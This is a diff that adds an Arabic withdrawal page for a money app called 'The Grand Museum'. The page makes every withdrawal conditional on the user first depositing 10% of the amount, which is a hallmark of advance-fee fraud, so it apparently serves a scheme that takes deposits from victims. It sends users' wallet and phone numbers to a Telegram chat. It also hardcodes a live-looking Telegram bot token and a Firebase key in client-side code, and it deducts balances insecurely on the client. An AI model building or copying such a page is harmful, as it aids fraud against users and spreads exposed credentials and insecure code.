@@ -1,0 +1,570 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>سحب الأموال • المتحف الكبير</title>
+    <meta name="description" content="اطلب سحب رصيدك بسهولة وأمان. يجب إيداع 10% من قيمة السحب أولاً.">
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&display=swap" rel="stylesheet">
+    <!-- Firebase -->
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-auth-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box;}
+        body{
+            font-family:'Cairo',sans-serif;
+            background:url("Object/qa.jpg") no-repeat center center fixed;
+            background-size:cover;
+            color:white;
+            max-width:420px;
+            margin:auto;
+        }
+        body::before{
+            content:"";
+            position:fixed;
+            inset:0;
+            background:rgba(0,0,0,0.85);
+            z-index:-1;
+        }
+        .toast-container{
+            position:fixed;
+            top:20px;
+            left:50%;
+            transform:translateX(-50%);
+            z-index:9999;
+            display:flex;
+            flex-direction:column;
+            gap:10px;
+            pointer-events:none;
+            max-width:350px;
+            width:90%;
+        }
+        .toast{
+            background:rgba(20,0,0,0.95);
+            border:2px solid #FF0000;
+            border-radius:12px;
+            padding:12px 18px;
+            color:white;
+            font-weight:bold;
+            box-shadow:0 0 30px #FF0000;
+            animation:toastIn 0.3s ease-out, toastOut 0.3s ease-in 2.5s forwards;
+            text-align:center;
+            backdrop-filter:blur(10px);
+        }
+        .toast.success{ border-color:#00ff00; box-shadow:0 0 30px #00ff00; }
+        .toast.error{ border-color:#FF0000; }
+        @keyframes toastIn{ from{opacity:0;transform:translateY(-20px);} to{opacity:1;transform:translateY(0);} }
+        @keyframes toastOut{ from{opacity:1;} to{opacity:0;transform:translateY(-20px);} }
+        .header{
+            position:sticky;
+            top:0;
+            display:flex;
+            justify-content:space-between;
+            align-items:center;
+            padding:15px;
+            background:rgba(0,0,0,0.9);
+            border-bottom:1px solid rgba(255,215,0,0.3);
+            backdrop-filter:blur(10px);
+            z-index:10;
+        }
+        .header h1{ font-size:18px; font-weight:900; color:gold; text-shadow:0 0 15px gold; margin:0; }
+        .back{ font-size:13px; color:#00ffcc; cursor:pointer; }
+        .container{ padding:15px; display:flex; flex-direction:column; gap:18px; }
+        .card{
+            background:rgba(0,0,0,0.7);
+            border:2px solid gold;
+            border-radius:20px;
+            padding:15px;
+            box-shadow:0 0 15px rgba(255,215,0,0.4);
+        }
+        .balance-row{
+            display:flex;
+            justify-content:space-between;
+            align-items:center;
+            background:rgba(255,215,0,0.08);
+            border-radius:12px;
+            padding:12px 16px;
+            margin:8px 0;
+            border:1px solid rgba(255,215,0,0.2);
+        }
+        .balance-label{ font-weight:600; color:gold; }
+        .balance-value{ font-size:18px; font-weight:800; background:rgba(255,215,0,0.15); padding:4px 12px; border-radius:20px; }
+        select, input{
+            width:100%;
+            padding:14px;
+            margin-bottom:12px;
+            border-radius:12px;
+            border:1px solid gold;
+            background:#0e0e0e;
+            color:white;
+            font-family:'Cairo',sans-serif;
+        }
+        select:focus, input:focus{ outline:none; border-color:#FFA500; box-shadow:0 0 15px gold; }
+        .currency-options{
+            display:flex;
+            gap:20px;
+            justify-content:center;
+            margin-bottom:12px;
+        }
+        .currency-options label{ color:gold; display:flex; align-items:center; gap:5px; cursor:pointer; }
+        .currency-options input[type="radio"]{ width:auto; margin:0; accent-color:gold; }
+        .converted-amount{
+            text-align:center;
+            color:gold;
+            font-size:14px;
+            margin-top:-5px;
+            margin-bottom:10px;
+            background:rgba(255,215,0,0.1);
+            padding:8px;
+            border-radius:8px;
+            border:1px solid rgba(255,215,0,0.3);
+        }
+        .deposit-warning{
+            background:rgba(255,100,0,0.2);
+            border:1px solid #ff6600;
+            border-radius:12px;
+            padding:12px;
+            margin:12px 0;
+            text-align:center;
+        }
+        .deposit-warning .required{ font-size:20px; font-weight:bold; color:#ffaa00; }
+        button{
+            width:100%;
+            padding:14px;
+            border:none;
+            border-radius:15px;
+            background:gold;
+            color:black;
+            font-weight:bold;
+            font-size:16px;
+            cursor:pointer;
+            box-shadow:0 0 15px gold;
+            transition:all 0.2s;
+            margin-bottom:8px;
+        }
+        button:hover:not(:disabled){ transform:translateY(-2px); box-shadow:0 0 25px gold; }
+        button:disabled{ opacity:0.5; cursor:not-allowed; }
+        .note{ text-align:center; margin:10px 0; color:#ccc; font-size:13px; }
+        .loader{
+            display:none;
+            width:20px;
+            height:20px;
+            border:3px solid #f3f3f3;
+            border-top:3px solid gold;
+            border-radius:50%;
+            animation:spin 1s linear infinite;
+            margin:10px auto;
+        }
+        @keyframes spin{ 0%{transform:rotate(0deg);} 100%{transform:rotate(360deg);} }
+        .bottom-nav{
+            position:fixed; bottom:0; left:0; right:0;
+            max-width:480px; margin:0 auto;
+            background:linear-gradient(180deg, #8b1a1a, #6a0d0d);
+            display:flex; justify-content:space-around;
+            padding:10px 0 18px;
+            border-top:3px solid #e6b422;
+            box-shadow:0 -5px 20px rgba(0,0,0,0.8);
+            z-index:100;
+        }
+        .nav-item{
+            text-align:center;
+            cursor:pointer;
+            transition:transform 0.2s;
+            width:70px;
+        }
+        .nav-item:active{ transform:scale(0.95); }
+        .nav-circle{
+            width:55px; height:55px;
+            border-radius:50%;
+            background:#1a0e0e;
+            border:2px solid #b22222;
+            display:flex;
+            justify-content:center;
+            align-items:center;
+            font-size:30px;
+            color:#b22222;
+            margin:0 auto 4px;
+            transition:all 0.3s;
+            box-shadow:0 0 10px rgba(180,40,40,0.6);
+        }
+        .nav-item.current-page .nav-circle{
+            color:#FFD700;
+            border-color:#FFD700;
+            box-shadow:0 0 15px #FFD700;
+            animation:pulse 1.5s infinite;
+        }
+        @keyframes pulse{
+            0%{box-shadow:0 0 5px #FFD700;}
+            50%{box-shadow:0 0 20px #FFD700;}
+            100%{box-shadow:0 0 5px #FFD700;}
+        }
+        .nav-label{
+            font-size:12px;
+            font-weight:700;
+            color:#ffdb8e;
+            text-shadow:0 0 5px #b8860b;
+            display:none;
+            height:18px;
+            margin-top:2px;
+        }
+        .nav-item.showing .nav-label{ display:block; }
+    </style>
+</head>
+<body>
+<div class="toast-container" id="toastContainer"></div>
+<div class="header">
+    <h1>💰 سحب الأموال</h1>
+    <div class="back" onclick="goBack()">⬅ رجوع</div>
+</div>
+<div class="container">
+    <div class="card">
+        <div class="balance-row">
+            <span class="balance-label">💵 رصيدك الحالي</span>
+            <span class="balance-value" id="balanceDisplay">0.00 جنيه</span>
+        </div>
+        <div class="balance-row">
+            <span class="balance-label">📥 إجمالي إيداعاتك</span>
+            <span class="balance-value" id="totalDepositsDisplay">0.00 جنيه</span>
+        </div>
+        <select id="method">
+            <option value="">اختر طريقة السحب</option>
+            <option value="فودافون كاش">فودافون كاش</option>
+            <option value="اتصالات كاش">اتصالات كاش</option>
+            <option value="اورنج كاش">اورنج كاش</option>
+            <option value="Binance">Binance</option>
+            <option value="OKX">OKX</option>
+        </select>
+        <input type="text" id="accountAddress" placeholder="رقم المحفظة أو العنوان">
+        <div class="currency-options">
+            <label><input type="radio" name="currency" value="EGP" checked> جنيه مصري (EGP)</label>
+            <label><input type="radio" name="currency" value="USD"> دولار (USD)</label>
+        </div>
+        <input type="number" id="amount" placeholder="المبلغ" min="0.01" step="any" oninput="updateCalculations()">
+        <div class="converted-amount" id="convertedAmount"></div>
+        <!-- تنبيه شرط الإيداع 10% -->
+        <div class="deposit-warning" id="depositWarning">
+            <span>🔔 يجب أن يكون لديك إيداعات لا تقل عن </span>
+            <span class="required" id="requiredDeposit">0.00 جنيه</span>
+            <span> (10% من قيمة السحب)</span>
+        </div>
+        <div class="note" id="minNote">* الحد الأدنى 500 جنيه (≈ 10 دولار)</div>
+        <div class="loader" id="loader"></div>
+        <button onclick="confirmWithdraw(event)" id="submitBtn">تأكيد طلب السحب</button>
+        <button onclick="location.href='transactions.html'">📋 سجل المعاملات</button>
+    </div>
+    <button onclick="location.href='dashboard.html'">العودة للوحة التحكم</button>
+</div>
+<!-- Bottom Nav -->
+<div class="bottom-nav">
+    <div class="nav-item" data-url="dashboard.html" data-label="الرئيسية" data-egypt="𓂀" data-alt="🏠">
+        <div class="nav-circle">𓂀</div><div class="nav-label">الرئيسية</div>
+    </div>
+    <div class="nav-item" data-url="museum.html" data-label="المتحف" data-egypt="𓆣" data-alt="🏺">
+        <div class="nav-circle">𓆣</div><div class="nav-label">المتحف</div>
+    </div>
+    <div class="nav-item" data-url="statue1.html" data-label="المرحلة 1" data-egypt="𓁹" data-alt="⚒️">
+        <div class="nav-circle">𓁹</div><div class="nav-label">المرحلة 1</div>
+    </div>
+    <div class="nav-item" data-url="profile.html" data-label="حسابي" data-egypt="☥" data-alt="👤">
+        <div class="nav-circle">☥</div><div class="nav-label">حسابي</div>
+    </div>
+</div>
+<script>
+// ========== الإعدادات ==========
+const TELEGRAM_TOKEN = "8535863939:AAFC4qgREiGQC-4c1QCQNrNp3gMprRsQRTs";
+const TELEGRAM_CHAT_ID = "6733319757";
+const USD_TO_EGP = 50;
+const MIN_EGP = 500;           // 10 دولار
+const DEPOSIT_RATIO = 0.10;    // 10%
+
+// ========== Toast ==========
+function showCustomToast(msg, type='success'){
+    const container = document.getElementById('toastContainer');
+    const toast = document.createElement('div');
+    toast.className = 'toast '+type;
+    toast.innerHTML = (type==='success'?'✅ ':'❌ ') + msg;
+    container.appendChild(toast);
+    setTimeout(()=>toast.remove(), 3000);
+}
+
+// ========== Firebase ==========
+firebase.initializeApp({
+    apiKey: "AIzaSyB78JT_cbPMizvzKWBrQoQUe3-zukHrr1U",
+    authDomain: "pharacoin.firebaseapp.com",
+    projectId: "pharacoin"
+});
+const auth = firebase.auth();
+const db = firebase.firestore();
+
+let currentUser = null;
+let userCoinsEGP = 0;          // الرصيد الأساسي بالجنيه
+let totalDepositsEGP = 0;      // إجمالي الإيداعات بالجنيه
+
+// الاستماع للمستخدم
+auth.onAuthStateChanged(user => {
+    if (!user) window.location.href = 'login.html';
+    else {
+        currentUser = user;
+        db.collection("users").doc(user.uid).onSnapshot(doc => {
+            if (doc.exists) {
+                const data = doc.data();
+                userCoinsEGP = data.coins || 0;
+                totalDepositsEGP = data.totalDeposits || 0;  // حقل الإيداعات
+                updateBalanceDisplay();
+                updateCalculations();
+            }
+        }, err => showCustomToast("فشل تحميل البيانات", "error"));
+    }
+});
+
+// تحديث عرض الأرصدة
+function updateBalanceDisplay(){
+    const currency = document.querySelector('input[name="currency"]:checked').value;
+    const balanceSpan = document.getElementById('balanceDisplay');
+    const depositSpan = document.getElementById('totalDepositsDisplay');
+    
+    if (currency === 'EGP') {
+        balanceSpan.innerText = userCoinsEGP.toLocaleString() + ' جنيه';
+        depositSpan.innerText = totalDepositsEGP.toLocaleString() + ' جنيه';
+    } else {
+        const usdBalance = (userCoinsEGP / USD_TO_EGP).toFixed(2);
+        const usdDeposit = (totalDepositsEGP / USD_TO_EGP).toFixed(2);
+        balanceSpan.innerText = usdBalance + ' دولار';
+        depositSpan.innerText = usdDeposit + ' دولار';
+    }
+}
+
+// تحديث نص الحد الأدنى
+function updateMinNote(){
+    const currency = document.querySelector('input[name="currency"]:checked').value;
+    const note = document.getElementById('minNote');
+    if (currency === 'EGP') {
+        note.innerText = `* الحد الأدنى ${MIN_EGP} جنيه (≈ 10 دولار)`;
+    } else {
+        note.innerText = `* الحد الأدنى 10 دولار (≈ ${MIN_EGP} جنيه)`;
+    }
+}
+
+// الحسابات عند تغيير المبلغ أو العملة
+function updateCalculations(){
+    const amount = parseFloat(document.getElementById('amount').value) || 0;
+    const currency = document.querySelector('input[name="currency"]:checked').value;
+    const convertedDiv = document.getElementById('convertedAmount');
+    const requiredSpan = document.getElementById('requiredDeposit');
+    const submitBtn = document.getElementById('submitBtn');
+    const warningDiv = document.getElementById('depositWarning');
+    
+    // عرض التحويل
+    if (amount <= 0) {
+        convertedDiv.innerHTML = '';
+    } else {
+        if (currency === 'EGP') {
+            const usdAmount = (amount / USD_TO_EGP).toFixed(2);
+            convertedDiv.innerHTML = `💵 يعادل ${usdAmount} دولار`;
+        } else {
+            const egpAmount = (amount * USD_TO_EGP).toFixed(2);
+            convertedDiv.innerHTML = `🇪🇬 يعادل ${egpAmount} جنيه`;
+        }
+    }
+    
+    // حساب المبلغ بالجنيه للمقارنات
+    let amountEGP = amount;
+    if (currency === 'USD') amountEGP = amount * USD_TO_EGP;
+    
+    const requiredDepositEGP = amountEGP * DEPOSIT_RATIO;
+    
+    // عرض المبلغ المطلوب بالعملة الحالية
+    if (currency === 'EGP') {
+        requiredSpan.innerText = requiredDepositEGP.toLocaleString() + ' جنيه';
+    } else {
+        const requiredUSD = (requiredDepositEGP / USD_TO_EGP).toFixed(2);
+        requiredSpan.innerText = requiredUSD + ' دولار';
+    }
+    
+    // التحقق من الشروط
+    const isValidAmount = (currency === 'EGP' && amount >= MIN_EGP) || (currency === 'USD' && amount >= 10);
+    const hasEnoughBalance = amountEGP <= userCoinsEGP;
+    const hasEnoughDeposit = requiredDepositEGP <= totalDepositsEGP;
+    
+    if (!isValidAmount || !hasEnoughBalance || !hasEnoughDeposit) {
+        submitBtn.disabled = true;
+        warningDiv.style.borderColor = hasEnoughDeposit ? '#ff6600' : '#ff0000';
+        warningDiv.style.background = hasEnoughDeposit ? 'rgba(255,100,0,0.2)' : 'rgba(255,0,0,0.15)';
+    } else {
+        submitBtn.disabled = false;
+        warningDiv.style.borderColor = '#ff6600';
+        warningDiv.style.background = 'rgba(255,100,0,0.2)';
+    }
+}
+
+// ربط تغيير العملة
+document.querySelectorAll('input[name="currency"]').forEach(r => {
+    r.addEventListener('change', ()=>{
+        updateBalanceDisplay();
+        updateMinNote();
+        updateCalculations();
+    });
+});
+
+function goBack(){ history.back(); }
+
+// التحقق من رقم الهاتف المصري
+function validatePhone(phone, method){
+    let clean = phone.replace(/\s+/g,'').replace(/[^\d]/g,'');
+    const prefixes = {
+        'فودافون كاش': ['010','015','016'],
+        'اتصالات كاش': ['011'],
+        'اورنج كاش': ['012']
+    };
+    if (!prefixes[method]) return true;
+    if (clean.length !== 11) return false;
+    return prefixes[method].some(p => clean.startsWith(p));
+}
+
+// إرسال إشعار تيليجرام
+async function sendTelegram(data, currency){
+    try{
+        const msg = `
+🆕 طلب سحب جديد
+👤 ${data.username || 'غير معروف'}
+🔹 الطريقة: ${data.method}
+📞 العنوان: ${data.address}
+💰 المبلغ: ${data.amount} ${currency}
+💵 الرصيد بعد السحب: ${(userCoinsEGP - data.amountEGP).toLocaleString()} جنيه
+📥 إيداعات المستخدم: ${totalDepositsEGP.toLocaleString()} جنيه
+🆔 ${data.userId}
+🕐 ${new Date().toLocaleString('ar-EG')}`;
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`,{
+            method:'POST',
+            headers:{'Content-Type':'application/json'},
+            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: msg })
+        });
+    }catch(e){ console.warn('Telegram error'); }
+}
+
+// تأكيد السحب
+async function confirmWithdraw(event){
+    const method = document.getElementById('method').value;
+    const address = document.getElementById('accountAddress').value.trim();
+    const amount = parseFloat(document.getElementById('amount').value);
+    const currency = document.querySelector('input[name="currency"]:checked').value;
+    const submitBtn = document.getElementById('submitBtn');
+    const loader = document.getElementById('loader');
+    
+    if (!method || !address || !amount) {
+        showCustomToast('يرجى إدخال جميع البيانات', 'error');
+        return;
+    }
+    
+    // التحقق من الحد الأدنى
+    if ((currency==='EGP' && amount < MIN_EGP) || (currency==='USD' && amount < 10)) {
+        showCustomToast(`الحد الأدنى ${currency==='EGP'? MIN_EGP+' جنيه' : '10 دولار'}`, 'error');
+        return;
+    }
+    
+    // التحقق من رقم الهاتف
+    if (['فودافون كاش','اتصالات كاش','اورنج كاش'].includes(method)){
+        if (!validatePhone(address, method)){
+            let err = '';
+            if(method==='فودافون كاش') err = 'رقم فودافون كاش يجب أن يبدأ بـ 010/015/016';
+            else if(method==='اتصالات كاش') err = 'رقم اتصالات كاش يجب أن يبدأ بـ 011';
+            else err = 'رقم اورنج كاش يجب أن يبدأ بـ 012';
+            showCustomToast(err, 'error');
+            return;
+        }
+    }
+    
+    let amountEGP = amount;
+    if (currency === 'USD') amountEGP = amount * USD_TO_EGP;
+    
+    if (amountEGP > userCoinsEGP) {
+        showCustomToast('رصيد غير كافٍ', 'error');
+        return;
+    }
+    
+    const requiredDeposit = amountEGP * DEPOSIT_RATIO;
+    if (requiredDeposit > totalDepositsEGP) {
+        showCustomToast(`يجب أن يكون لديك إيداعات لا تقل عن ${requiredDeposit.toLocaleString()} جنيه`, 'error');
+        return;
+    }
+    
+    submitBtn.disabled = true;
+    submitBtn.innerText = 'جاري المعالجة...';
+    loader.style.display = 'block';
+    
+    try {
+        const userDoc = await db.collection('users').doc(currentUser.uid).get();
+        const userData = userDoc.data();
+        const withdrawData = {
+            userId: currentUser.uid,
+            username: userData.username || '',
+            method, address,
+            amount, currency,
+            amountEGP,
+            requiredDepositEGP: requiredDeposit,
+            status: 'pending',
+            createdAt: firebase.firestore.FieldValue.serverTimestamp()
+        };
+        
+        await db.collection('withdrawals').add(withdrawData);
+        // خصم من رصيد coins
+        await db.collection('users').doc(currentUser.uid).update({
+            coins: firebase.firestore.FieldValue.increment(-amountEGP)
+        });
+        
+        sendTelegram(withdrawData, currency).catch(e=>{});
+        showCustomToast('تم إرسال طلب السحب بنجاح', 'success');
+        
+        document.getElementById('method').value = '';
+        document.getElementById('accountAddress').value = '';
+        document.getElementById('amount').value = '';
+        document.getElementById('convertedAmount').innerHTML = '';
+        updateCalculations();
+        
+        setTimeout(()=> location.href = 'transactions.html', 2000);
+    } catch(err){
+        showCustomToast('خطأ: '+err.message, 'error');
+        submitBtn.disabled = false;
+        submitBtn.innerText = 'تأكيد طلب السحب';
+        loader.style.display = 'none';
+    }
+}
+
+// تهيئة النصوص
+updateMinNote();
+updateBalanceDisplay();
+
+// ========== Navbar ==========
+const navItems = document.querySelectorAll('.nav-item');
+const currentPath = location.pathname.split('/').pop() || 'withdraw.html';
+navItems.forEach(i => i.classList.remove('current-page'));
+navItems.forEach(i => { if(i.dataset.url === currentPath) i.classList.add('current-page'); });
+let timer = null, currentItem = null;
+navItems.forEach((item, idx) => {
+    item.addEventListener('click', function(e){
+        if(this.classList.contains('current-page')) return;
+        if(timer){
+            clearTimeout(timer); timer = null;
+            if(currentItem){
+                const c = currentItem.querySelector('.nav-circle');
+                c.textContent = currentItem.dataset.egypt;
+                currentItem.classList.remove('showing');
+            }
+        }
+        const circle = this.querySelector('.nav-circle');
+        circle.textContent = this.dataset.alt;
+        this.classList.add('showing');
+        currentItem = this;
+        timer = setTimeout(()=>{
+            const c = currentItem.querySelector('.nav-circle');
+            c.textContent = currentItem.dataset.egypt;
+            currentItem.classList.remove('showing');
+            timer = null; currentItem = null;
+            window.location.href = currentItem.dataset.url;
+        }, 3000);
+    });
+});
+</script>
+</body>
+</html>
